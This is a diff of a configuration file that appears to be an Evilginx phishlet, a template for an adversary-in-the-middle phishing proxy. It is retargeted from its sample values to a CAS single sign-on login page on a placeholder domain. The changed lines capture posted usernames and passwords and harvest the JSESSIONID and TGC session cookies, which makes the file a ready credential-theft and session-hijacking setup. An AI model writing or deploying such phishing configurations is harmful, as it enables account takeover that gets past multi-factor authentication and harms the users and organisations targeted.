@@ -1,14 +1,15 @@
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: 'cas', domain: 'example.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+  - {triggers_on: 'cas.example.com', orig_sub: 'cas', domain: 'example.com', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
 auth_tokens:
-  - domain: '.academy.breakdev.org'
-    keys: ['cookie_name']
+  - domain: '.cas.example.com'
+    keys: ['JSESSIONID', 'TGC']
+    type: 'cookie'
 credentials:
   username:
-    key: 'email'
+    key: 'username'
     search: '(.*)'
     type: 'post'
   password:
@@ -16,5 +17,5 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'academy.breakdev.org'
-  path: '/evilginx-mastery'
+  domain: 'cas.example.com'
+  path: '/login'
